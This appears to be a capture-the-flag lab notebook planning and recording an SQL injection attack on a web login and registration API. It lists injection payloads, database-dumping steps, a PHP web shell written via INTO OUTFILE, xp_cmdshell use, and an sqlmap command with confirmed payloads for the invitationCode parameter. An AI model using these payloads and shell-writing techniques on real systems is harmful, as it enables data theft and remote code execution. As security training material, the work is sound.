### Plan of Attack

**Phase 1 — Recon (5-10 min)**
- Capture login request in Caido
- Check response headers for stack clues (X-Powered-By, Server)
- Fuzz for other endpoints: `/robots.txt`, `/index.php`, `/phpinfo.php`, `/admin.php`
- Baseline normal vs error responses

**Phase 2 — SQLi Detection (10-15 min)**
- Test login form with payloads:
  - Boolean: `' OR '1'='1` / `' OR 1=1--`
  - Error: `'` (single quote to trigger syntax error)
  - Time-based: `' OR SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `'; SELECT pg_sleep(5)--` (PostgreSQL)
- Identify DB type from error messages or timing behavior
- Determine injection type: UNION-based, error-based, blind, or stacked queries

**Phase 3 — Data Extraction — admin hash (Q1)**
- Manual UNION: `' UNION SELECT 1,2,3--` → enumerate columns
- Read `information_schema.tables` → find user table
- Read columns → identify password/hash field
- Dump admin password hash
- *Fallback:* sqlmap if manual enumeration stalls

**Phase 4 — Web Root Discovery (Q2)**
- MySQL `LOAD_FILE('/etc/passwd')` or `@@datadir`, `@@basedir` for hints
- Error messages often leak full file paths
- `phpinfo()` if accessible shows `DOCUMENT_ROOT`
- Post-RCE: `pwd` or `getcwd()` in shell

**Phase 5 — RCE + Flag (Q3)**
- **MySQL path:** `INTO OUTFILE '/var/www/html/shell.php'` with `<?php system($_GET['cmd']); ?>`
- **MSSQL path:** `xp_cmdshell` re-enable → `EXEC xp_cmdshell 'whoami'`
- **PostgreSQL path:** `COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'` or UDF
- Once shell: `cat /flag_*.txt`

## Phase 4 — SQLMap Confirmation — 2026-05-11 (09:18-09:23)

### SQLMap Command Used
```bash
sqlmap -u "https://154.57.164.78:31595/api/register.php" \
  --data='username=test&password=test123&repeatPassword=test123&invitationCode=abcd-efgh-1234' \
  -p invitationCode \
  --batch \
  --level=5 \
  --risk=3 \
  --technique=BEST \
  --dump
```

### SQLMap Results
**🎯 CONFIRMED: `invitationCode` is vulnerable to SQL injection!**

| Technique | Type | Payload Example |
|-----------|------|-----------------|
| **Boolean-based blind** | `OR boolean-based blind - WHERE or HAVING clause (NOT)` | `abcd-efgh-1234') OR NOT 7167=7167-- idXk` |
| **Time-based blind** | `MySQL >= 5.0.12 AND time-based blind (query SLEEP)` | `abcd-efgh-1234') AND (SELECT 3366 FROM (SELECT(SLEEP(5)))BzeL)-- QXnY` |

### Key Findings
- **DBMS:** MySQL (heuristic test confirmed)
- **Backend uses `)` closing parenthesis** — payload requires `')` to close the query properly
- **276 HTTP requests** for full detection
- **Injection confirmed not a false positive** — sqlmap validated with follow-up checks

### Why Manual Tests Failed
- Our payloads missed the **closing parenthesis `)`** in the query structure
- The actual injection syntax is: `abcd-efgh-1234') OR NOT 7167=7167-- `
- This explains why simple `'` and `' OR 1=1--` gave 500 — they didn't close the parenthesis correctly
